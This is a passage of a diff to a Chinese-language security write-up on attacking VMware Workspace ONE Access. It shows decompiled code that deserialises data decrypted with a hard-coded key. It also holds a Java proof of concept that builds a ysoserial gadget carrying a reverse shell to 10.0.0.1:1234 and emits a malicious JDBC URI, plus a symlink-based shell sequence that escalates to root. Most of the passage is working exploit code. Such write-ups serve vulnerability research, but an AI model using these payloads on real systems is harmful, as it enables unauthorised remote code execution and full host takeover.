+        byte[] var2 = Encrypt.readByteArray(var1);
+        if (var2 == null) {
+            log.debug(new Object[]{"failed to read cipherText"});
+            return false;
+        } else {
+            try {
+                byte[] var3 = Encrypt.decrypt(var2, new String(keyBytes_v2)); 
+                if (var3 == null) {
+                    log.debug(new Object[]{"failed to decrypt state data"});
+                    return false;
+                } else {
+                    ByteArrayInputStream var4 = new ByteArrayInputStream(var3);
+                    ObjectInputStream var5 = new ObjectInputStream(var4);
+                    this._htEvalStart = (Hashtable)var5.readObject(); 
+                    log.debug(new Object[]{"restored " + this._htEvalStart.size() + " entries from state info"});
+                    return true;
+                }
+            } catch (Exception var6) {
+                log.warn(new Object[]{var6.getMessage()});
+                return false;
+            }
+        }
+    }
 
 
 ```
@@ -983,35 +983,35 @@ private boolean deserialize_v2(DataInputStream var1) throws IOException {
 在这里先进行调用 decrypt，并使用硬编码密钥 keyBytes_v2 解密字符串，然后对可控字符串调用 readObject 进行反序列化。所以这里是通过 JDBC URI 注入去打 LicenseChecker 类中的反序列化，poc 如下：
 
 ```
-import com.vmware.licensecheck.LicenseChecker;
-import com.vmware.licensecheck.LicenseHandle;
-import com.vmware.licensecheck.MyBase64;
-import ysoserial.payloads.ObjectPayload.Utils;
-import java.lang.reflect.Field;
-import java.net.URLEncoder;
-import java.util.Hashtable;
-import java.io.*;
+import com.vmware.licensecheck.LicenseChecker;
+import com.vmware.licensecheck.LicenseHandle;
+import com.vmware.licensecheck.MyBase64;
+import ysoserial.payloads.ObjectPayload.Utils;
+import java.lang.reflect.Field;
+import java.net.URLEncoder;
+import java.util.Hashtable;
+import java.io.*;
 
-public class Poc {
-    public static void main(String[] args) throws Exception {
-        String shell = MyBase64.encode("bash -c \"bash -i >& /dev/tcp/10.0.0.1/1234 0>&1\"".getBytes());
-        Object payload = Utils.makePayloadObject("CommonsBeanutils1", String.format("sh -c $@|sh . echo echo %s|base64 -d|bash", shell));
-        LicenseChecker lc = new LicenseChecker(null);
-        Field handleField = LicenseChecker.class.getDeclaredField("_handle");
-        handleField.setAccessible(true);
-        LicenseHandle lh = (LicenseHandle)handleField.get(lc);
-        Field htEvalStartField = LicenseHandle.class.getDeclaredField("_htEvalStart");
-        htEvalStartField.setAccessible(true);
-        Field isDirtyField = LicenseHandle.class.getDeclaredField("_isDirty");
-        isDirtyField.setAccessible(true);
-        Hashtable<Integer, Object> ht = new Hashtable<Integer, Object>();
-        ht.put(1337, payload);
-        htEvalStartField.set(lh, ht);
-        isDirtyField.set(lh, true);
-        handleField.set(lc, lh);
-        String payload = URLEncoder.encode(URLEncoder.encode(lc.getState(), "UTF-8"), "UTF-8");
-        System.out.println(String.format("(+) jdbc:postgresql://si/saas?socketFactory=com.vmware.licensecheck.LicenseChecker%%26socketFactoryArg=%s", payload));
-    }
+public class Poc {
+    public static void main(String[] args) throws Exception {
+        String shell = MyBase64.encode("bash -c \"bash -i >& /dev/tcp/10.0.0.1/1234 0>&1\"".getBytes());
+        Object payload = Utils.makePayloadObject("CommonsBeanutils1", String.format("sh -c $@|sh . echo echo %s|base64 -d|bash", shell));
+        LicenseChecker lc = new LicenseChecker(null);
+        Field handleField = LicenseChecker.class.getDeclaredField("_handle");
+        handleField.setAccessible(true);
+        LicenseHandle lh = (LicenseHandle)handleField.get(lc);
+        Field htEvalStartField = LicenseHandle.class.getDeclaredField("_htEvalStart");
+        htEvalStartField.setAccessible(true);
+        Field isDirtyField = LicenseHandle.class.getDeclaredField("_isDirty");
+        isDirtyField.setAccessible(true);
+        Hashtable<Integer, Object> ht = new Hashtable<Integer, Object>();
+        ht.put(1337, payload);
+        htEvalStartField.set(lh, ht);
+        isDirtyField.set(lh, true);
+        handleField.set(lc, lh);
+        String payload = URLEncoder.encode(URLEncoder.encode(lc.getState(), "UTF-8"), "UTF-8");
+        System.out.println(String.format("(+) jdbc:postgresql://si/saas?socketFactory=com.vmware.licensecheck.LicenseChecker%%26socketFactoryArg=%s", payload));
+    }
 }
 
 
@@ -1032,17 +1032,17 @@ jdbc:postgresql://si/saas?socketFactory=com.vmware.licensecheck.LicenseChecker%2
 在前文已经讲过，利用 publishCaCert.hzn 和 gatherConfig.hzn 脚本中的代码可以进行对具有 root 权限的文件进行覆盖重写，进而进行提权，poc 如下：
 
 ```
-sudo /usr/local/horizon/scripts/publishCaCert.hzn /opt/vmware/certproxy/bin/certproxyService.sh tmp
-mkdir tmp
-ln -s /opt/vmware/certproxy/bin/certproxyService.sh /tmp/debugConfig.txt
-sudo /usr/local/horizon/scripts/gatherConfig.hzn tmp
-rm -rf tmp
-chmod 755 /opt/vmware/certproxy/bin/certproxyService.sh
-echo "mv /etc/ssl/certs/tmp /opt/vmware/certproxy/bin/certproxyService.sh" > /opt/vmware/certproxy/bin/certproxyService.sh
-echo "chown root:root /opt/vmware/certproxy/bin/certproxyService.sh" >> /opt/vmware/certproxy/bin/certproxyService.sh
-echo "chmod 640 /opt/vmware/certproxy/bin/certproxyService.sh" >> /opt/vmware/certproxy/bin/certproxyService.sh
-echo "rm /tmp/a; rm /tmp/b; cd /root; python -c 'import pty; pty.spawn(\\\"/bin/bash\\\")'" >> /opt/vmware/certproxy/bin/certproxyService.sh
-sudo /opt/vmware/certproxy/bin/certproxyService.sh
+sudo /usr/local/horizon/scripts/publishCaCert.hzn /opt/vmware/certproxy/bin/certproxyService.sh tmp
+mkdir tmp
+ln -s /opt/vmware/certproxy/bin/certproxyService.sh /tmp/debugConfig.txt
+sudo /usr/local/horizon/scripts/gatherConfig.hzn tmp
+rm -rf tmp
+chmod 755 /opt/vmware/certproxy/bin/certproxyService.sh
+echo "mv /etc/ssl/certs/tmp /opt/vmware/certproxy/bin/certproxyService.sh" > /opt/vmware/certproxy/bin/certproxyService.sh
+echo "chown root:root /opt/vmware/certproxy/bin/certproxyService.sh" >> /opt/vmware/certproxy/bin/certproxyService.sh
+echo "chmod 640 /opt/vmware/certproxy/bin/certproxyService.sh" >> /opt/vmware/certproxy/bin/certproxyService.sh
+echo "rm /tmp/a; rm /tmp/b; cd /root; python -c 'import pty; pty.spawn(\\\"/bin/bash\\\")'" >> /opt/vmware/certproxy/bin/certproxyService.sh
+sudo /opt/vmware/certproxy/bin/certproxyService.sh
 
 ```
 
